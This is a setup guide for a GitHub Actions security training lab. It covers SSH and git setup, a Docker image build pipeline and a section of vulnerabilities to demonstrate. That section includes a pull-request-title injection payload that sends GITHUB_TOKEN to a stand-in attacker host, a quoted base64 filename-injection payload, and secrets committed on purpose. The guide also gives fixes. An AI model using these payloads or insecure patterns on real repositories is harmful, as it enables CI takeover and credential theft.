# GitHub + GitHub Actions CI/CD Setup Guide

This guide walks you through publishing the **SwiftDrop / pipeline-security** exercise to GitHub and running the included CI/CD pipeline that builds and pushes Docker images to GitHub Container Registry (GHCR).

The same repository will later be used to demonstrate real-world GitHub Actions security vulnerabilities.

---

## Prerequisites

| Tool | Check |
|------|-------|
| `git` | `git --version` |
| `ssh-keygen` | built into every Linux/macOS install |
| Docker (optional, for local testing) | `docker --version` |
| `gh` CLI (optional shortcut) | `gh --version` |

> **`gh` CLI is optional.** SSH keys + a browser cover everything. The `gh` commands shown
> throughout are labelled **(gh shortcut)** — skip them if you prefer the browser.

### Install gh CLI (optional, Kali-specific)

The GitHub CLI is not in Kali's default repos — you must add GitHub's own apt source:

```bash
curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg \
  | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg
sudo chmod go+r /usr/share/keyrings/githubcli-archive-keyring.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] \
  https://cli.github.com/packages stable main" \
  | sudo tee /etc/apt/sources.list.d/github-cli.list
sudo apt update && sudo apt install gh -y
```

---

## Part 1 — Create a GitHub Account

Go to https://github.com and register if you don't already have one.
Your **username** (e.g. `piotr-trainer`) will appear in every image URL, so choose it deliberately.

---

## Part 2 — Set Up SSH Authentication (Primary Method)

SSH keys are the standard authentication method for developers in corporate environments.
You generate a key pair locally, keep the private key on your machine, and add the public key to GitHub.
Git then uses the private key silently for every push and pull.

### 2.1 Configure your Git identity

These values appear in every commit you make:

```bash
git config --global user.name "Your Name"
git config --global user.email "you@example.com"
```

### 2.2 Generate an Ed25519 SSH key

Ed25519 is the current recommended algorithm — faster and more secure than RSA.

```bash
ssh-keygen -t ed25519 -C "you@example.com"
```

When prompted:
- **File location:** press Enter to accept the default (`~/.ssh/id_ed25519`)
- **Passphrase:** choose a strong passphrase (protects your private key if the file is stolen)

This creates two files:
```
~/.ssh/id_ed25519        ← private key — never share this
~/.ssh/id_ed25519.pub    ← public key — this goes to GitHub
```

### 2.3 Start the SSH agent and load the key

The agent holds your decrypted key in memory so you don't type the passphrase on every push:

```bash
eval "$(ssh-agent -s)"
ssh-add ~/.ssh/id_ed25519
```

To make this automatic on login, add those two lines to your `~/.bashrc` or `~/.zshrc`.

### 2.4 Copy your public key

```bash
cat ~/.ssh/id_ed25519.pub
```

Copy the entire output (one long line starting with `ssh-ed25519`).

### 2.5 Add the public key to GitHub

1. Go to **GitHub → Settings → SSH and GPG keys**
   (direct URL: https://github.com/settings/ssh/new)
2. Click **New SSH key**
3. **Title:** something descriptive, e.g. `kali-lab-machine`
4. **Key type:** `Authentication Key`
5. Paste the public key
6. Click **Add SSH key**

**(gh shortcut)** — does the same without opening a browser:
```bash
gh auth login   # choose SSH, then follow prompts — it uploads the key automatically
```

### 2.6 Test the connection

```bash
ssh -T git@github.com
```

Expected output:
```
Hi <your-username>! You've successfully authenticated, but GitHub does not provide shell access.
```

If you see `Permission denied (publickey)`, check that:
- The key was added to GitHub (Step 2.5)
- The SSH agent is running with the key loaded (Step 2.3)

---

## Part 3 — Create the GitHub Repository

### Option A — Browser (primary)

1. Go to https://github.com/new
2. **Repository name:** `pipeline-security-exercise`
3. **Description:** `CI/CD pipeline security exercise — Rails + Vue.js`
4. **Visibility:** Public (required for free GHCR usage with `GITHUB_TOKEN`)
5. Leave all other options unchecked (no README, no .gitignore — we'll push our own)
6. Click **Create repository**

GitHub will show you a page with setup instructions — keep it open, you'll need the SSH remote URL in the next step.

### Option B — gh CLI shortcut

```bash
gh repo create pipeline-security-exercise \
  --public \
  --description "CI/CD pipeline security exercise — Rails + Vue.js" \
  --clone=false
```

> **Visibility note:** Public repos can push to GHCR for free using the automatic `GITHUB_TOKEN`.
> Private repos work identically but count against your package storage quota.

---

## Part 4 — Initialise Git and Push the Exercise

All commands below run from inside the exercise directory:

```bash
cd /home/kali/Desktop/SecurityLabs/exercise-pipeline-security
```

### 4.1 Initialise the local repository

```bash
git init
git branch -M main
```

### 4.2 Add a .gitignore

```bash
cat > .gitignore << 'EOF'
# Rails runtime
backend/log/*.log
backend/tmp/
backend/storage/*.sqlite3
backend/storage/*.sqlite3-journal

# Node
frontend/node_modules/
frontend/dist/

# OS
.DS_Store
EOF
```

> **Training note:** `backend/config/master.key` and `backend/.kamal/secrets` are intentionally
> **not** in .gitignore. They contain real secrets and are committed on purpose to serve as
> a training example of leaked credentials in source control (see Part 8).
> In any real project these files must be gitignored and secrets stored in GitHub Secrets.

### 4.3 Stage and commit everything

```bash
git add .
git commit -m "Initial commit: pipeline-security exercise"
```

### 4.4 Add the SSH remote and push

Use the **SSH** remote URL (starts with `git@`), not the HTTPS one:

```bash
git remote add origin git@github.com:<your-username>/pipeline-security-exercise.git
git push -u origin main
```

The `-u` flag sets `origin/main` as the default upstream so future `git push` and `git pull`
commands need no arguments.

Confirm it's live — open the repo in the browser:

```bash
# Browser: https://github.com/<your-username>/pipeline-security-exercise
# gh shortcut:
gh repo view --web
```

---

## Part 5 — Understand the CI/CD Workflow

The workflow file already lives at `.github/workflows/build-and-publish.yml`.
GitHub Actions picks it up automatically once the file reaches the `main` branch.

### What the workflow does

```
push to main
      │
      ├─► Job: build-and-push-backend  (runs in parallel)
      │         • Checks out code
      │         • Logs into GHCR with GITHUB_TOKEN
      │         • Builds  ./backend/Dockerfile
      │         • Tags image:  ghcr.io/<owner>/pipeline-security-backend:latest
      │                        ghcr.io/<owner>/pipeline-security-backend:<git-sha>
      │         • Pushes both tags to GHCR
      │
      └─► Job: build-and-push-frontend  (runs in parallel)
                • Same steps for ./frontend/Dockerfile
                • Image: ghcr.io/<owner>/pipeline-security-frontend:latest
```

On a **pull request** the images are built but **not pushed** — safe when triggered from forks.

### Permissions used

```yaml
permissions:
  contents: read   # checkout the code
  packages: write  # push images to GHCR
```

`GITHUB_TOKEN` is provisioned automatically by GitHub for every run — no manual secret needed.

---

## Part 6 — Watch the Pipeline Run

### Browser (primary)

1. Go to your repository on GitHub
2. Click the **Actions** tab
3. Click the running workflow to see live logs

### gh CLI shortcut

```bash
gh run list --limit 5
gh run watch
```

### Verify images were published

**Browser:** Go to your GitHub profile → **Packages** tab.
You should see `pipeline-security-backend` and `pipeline-security-frontend`.

**gh CLI shortcut:**
```bash
gh api user/packages?package_type=container --jq '.[].name'
```

---

## Part 7 — Pull and Run the Images Locally

Docker uses HTTPS to talk to GHCR, so SSH keys don't apply here.
Authentication uses a **Personal Access Token (PAT)** or the `gh` CLI token.

### 7.1 Create a PAT for Docker login (browser)

1. Go to **GitHub → Settings → Developer settings → Personal access tokens → Tokens (classic)**
   (direct URL: https://github.com/settings/tokens/new)
2. **Note:** `docker-ghcr-pull`
3. **Expiration:** 30 days (or as needed)
4. **Scopes:** check `read:packages`
5. Click **Generate token** and copy it immediately — GitHub shows it only once

### 7.2 Log Docker in to GHCR

```bash
echo "<your-PAT>" | docker login ghcr.io -u <your-username> --password-stdin
```

**(gh shortcut)** — reuses the gh session token, no PAT needed:
```bash
echo $(gh auth token) | docker login ghcr.io -u $(gh api user --jq .login) --password-stdin
```

### 7.3 Pull the images

```bash
docker pull ghcr.io/<your-username>/pipeline-security-backend:latest
docker pull ghcr.io/<your-username>/pipeline-security-frontend:latest
```

### 7.4 Run the backend

```bash
docker run -d \
  -p 3000:80 \
  -e RAILS_MASTER_KEY=$(cat backend/config/master.key) \
  --name ps-backend \
  ghcr.io/<your-username>/pipeline-security-backend:latest
```

### 7.5 Run the frontend

```bash
docker run -d \
  -p 5173:80 \
  --name ps-frontend \
  ghcr.io/<your-username>/pipeline-security-frontend:latest
```

Open http://localhost:5173 — the SwiftDrop UI should load.

---

## Part 8 — Repository Structure Reference

```
pipeline-security-exercise/
├── .github/
│   └── workflows/
│       └── build-and-publish.yml   ← CI/CD pipeline
├── backend/
│   ├── Dockerfile                  ← Rails production image (multi-stage)
│   ├── config/
│   │   ├── master.key              ← ⚠ secret — intentional for training
│   │   └── credentials.yml.enc
│   └── .kamal/secrets              ← ⚠ secret — intentional for training
├── frontend/
│   └── Dockerfile                  ← Vue.js → nginx static image
├── install.sh
├── start.sh
└── PIPELINE-SETUP.md               ← this file
```

---

## Part 9 — GitHub Actions Security Issues to Demonstrate

This repository is set up to demonstrate the following classes of pipeline vulnerability.

### 9.1 Secrets in source code
**What:** `config/master.key` and `.kamal/secrets` are committed to the repo.
**Risk:** Anyone with read access has the Rails master key, which decrypts
`credentials.yml.enc` (database passwords, API keys, etc.).
**Demo:**
```bash
git log --all -p -- backend/config/master.key
```

### 9.2 Unpinned third-party Actions
**What:** The workflow references `actions/checkout@v4` and `docker/login-action@v3` by
mutable tag, not by immutable commit SHA.
**Risk:** A compromised or typo-squatted Action at that tag can exfiltrate `GITHUB_TOKEN`
or inject malicious build steps into every pipeline run.
**Demo:** Replace a tag with its pinned SHA and show the diff:
```yaml
# vulnerable — tag can be moved
uses: actions/checkout@v4

# hardened — SHA is immutable
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

### 9.3 Filename injection (untrusted file paths in a `run:` loop)

**What:** The `Sync Metadata` workflow (`.github/workflows/sync-metadata.yml`) collects the
**file paths a pull request changed** and interpolates them into a bash `for` loop with
`${{ … }}`:

```yaml
for f in ${{ steps.changed.outputs.files }}; do
  echo "Indexing $f"
done
```

GitHub Actions expands `${{ … }}` into the **script text before bash runs it**, so a file whose
*name* contains `$( … )` is executed as code. It triggers on a `/sync-metadata` comment and runs
with the base repo's write-scoped `GITHUB_TOKEN`.

**Risk:** An attacker commits a file whose **name** is a payload (using `${IFS}` for spaces, often
base64-encoded and piped to bash), opens a PR, comments `/sync-metadata`, and their code runs in
the target's CI with the live token. The file's *contents* are irrelevant — the diff looks clean.

This mirrors the real-world `DataDog/datadog-iac-scanner` finding, where a file named
`documentation/rules/$(echo${IFS}…${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md` achieved
code execution.

**The vulnerability is the combination of three choices** — remove any one and it collapses:
1. **Untrusted input** — attacker-supplied filenames from the PR.
2. **`${{ }}` interpolation into a `run:` loop** — the value becomes script, not data.
3. **Privileged context** — the run carries the base repo's write-scoped token.

**Full two-account walkthrough (target + attacker), the payload filename, the webhook.site
capture, and the fix (bind the file list to an `env:` variable) live in
[`Exercise_4.md`](./Exercise_4.md).**

**Remediation summary:**
```yaml
# Pass untrusted file paths through env: — never ${{ }} inside the loop
- name: Refresh metadata index
  env:
    CHANGED_FILES: ${{ steps.changed.outputs.files }}
  run: |
    while IFS= read -r f; do
      [ -n "$f" ] || continue
      echo "Indexing $f"          # treated as data, never executed
    done <<< "$CHANGED_FILES"
```

### 9.4 Script injection via untrusted input
**What:** Interpolating `${{ github.event.pull_request.title }}` directly into a `run:`
shell command hands control of that command to whoever opens a PR.
**Risk:** Remote code execution inside the runner with access to all in-scope secrets.
**Demo:** Add a step:
```yaml
- run: echo "Building PR: ${{ github.event.pull_request.title }}"
```
Then open a PR whose title is:
```
"; curl https://attacker.example/exfil?t=$GITHUB_TOKEN; echo "
```

### 9.5 Over-broad token permissions
**What:** Omitting the `permissions:` key causes `GITHUB_TOKEN` to inherit the repo's
default, which is `write-all` for most repositories.
**Risk:** A compromised step can push commits, approve PRs, create releases, or call any
GitHub API endpoint the token reaches.
**Demo:** Remove the `permissions:` block from the workflow, re-run, and show the token's
effective scopes via:
```bash
curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/rate_limit \
  | jq '.resources'
```

---

## Quick-Reference Cheat Sheet

```bash
# SSH key setup
ssh-keygen -t ed25519 -C "you@example.com"
eval "$(ssh-agent -s)" && ssh-add ~/.ssh/id_ed25519
cat ~/.ssh/id_ed25519.pub          # paste this into GitHub Settings → SSH keys
ssh -T git@github.com              # verify

# Git identity
git config --global user.name "Your Name"
git config --global user.email "you@example.com"

# Push repo (SSH remote)
git init && git branch -M main
git remote add origin git@github.com:<user>/<repo>.git
git push -u origin main

# Watch pipeline (browser preferred; gh as shortcut)
gh run list && gh run watch

# Docker / GHCR
echo "<PAT>" | docker login ghcr.io -u <user> --password-stdin
docker pull ghcr.io/<user>/pipeline-security-backend:latest
```
